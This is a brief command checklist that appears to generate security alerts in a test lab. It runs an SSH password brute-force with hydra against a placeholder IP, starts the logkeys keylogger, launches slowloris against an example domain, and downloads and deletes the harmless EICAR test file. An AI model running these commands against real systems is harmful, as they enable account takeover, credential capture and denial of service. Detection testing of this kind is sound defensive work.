#enable password auth

#enable external SSH access

#create 5 local users

hydra -I -L users.txt -P pass.txt {IP} -t 4 ssh

logkeys --start

perl slowloris.pl -dns server.contoso.com

nslookup eicar.com

wget http://{IP}/download/eicar.com

sudo rm eicar.com -f